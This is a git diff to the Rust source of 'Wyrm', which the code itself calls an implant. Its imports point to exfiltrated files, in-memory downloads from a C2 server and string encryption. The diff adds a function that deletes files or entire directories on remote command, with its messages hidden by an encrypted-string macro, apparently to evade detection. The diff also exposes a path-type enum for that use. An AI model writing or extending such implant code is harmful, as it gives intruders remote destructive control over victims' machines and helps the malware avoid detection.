@@ -8,6 +8,7 @@ use serde::Serialize;
 #[cfg(debug_assertions)]
 use shared::pretty_print::print_failed;
 use shared::tasks::{ExfiltratedFile, FileDropMetadata, WyrmResult};
+use str_crypter::{decrypt_string, sc};
 
 use crate::{
     comms::download_file_with_uri_in_memory,
@@ -127,7 +128,7 @@ pub enum MoveCopyAction {
 }
 
 /// Implementation for copying or moving a file from location a to b.
-/// .
+///
 /// The function takes a [`MoveCopyAction`] which determines whether the function moves or copies a file
 pub fn move_or_copy_file(
     implant: &Wyrm,
@@ -196,6 +197,47 @@ pub fn move_or_copy_file(
             };
         }
     }
+}
+
+pub fn rm_from_fs(
+    implant: &Wyrm,
+    metadata: &str,
+    target_type: PathParseType,
+) -> Option<impl Serialize + use<>> {
+    let from = match serde_json::from_str::<String>(&metadata) {
+        Ok(v) => v,
+        Err(e) => return Some(WyrmResult::Err::<String>(e.to_string())),
+    };
+
+    let from_path = match parse_path(&from, &implant.current_working_directory, target_type) {
+        WyrmResult::Ok(p) => p,
+        WyrmResult::Err(e) => return Some(WyrmResult::Err(e)),
+    };
+
+    match target_type {
+        PathParseType::Directory => {
+            if let Err(e) = fs::remove_dir_all(from_path) {
+                return Some(WyrmResult::Err(format!(
+                    "{} {}",
+                    sc!("Error removing directory:", 69).unwrap(),
+                    e.to_string()
+                )));
+            }
+        }
+        PathParseType::File => {
+            if let Err(e) = fs::remove_file(from_path) {
+                return Some(WyrmResult::Err(format!(
+                    "{} {}",
+                    sc!("Error removing file:", 68).unwrap(),
+                    e.to_string()
+                )));
+            }
+        }
+    }
+
+    Some(WyrmResult::Ok(
+        sc!("Operation completed successfully", 146).unwrap(),
+    ))
 }
 
 /// Drops a file to the disk in the current directory from the C2.
@@ -289,8 +331,8 @@ pub fn change_directory(
     }
 }
 
-#[derive(PartialEq, Eq)]
-enum PathParseType {
+#[derive(PartialEq, Eq, Copy, Clone)]
+pub enum PathParseType {
     Directory,
     File,
 }
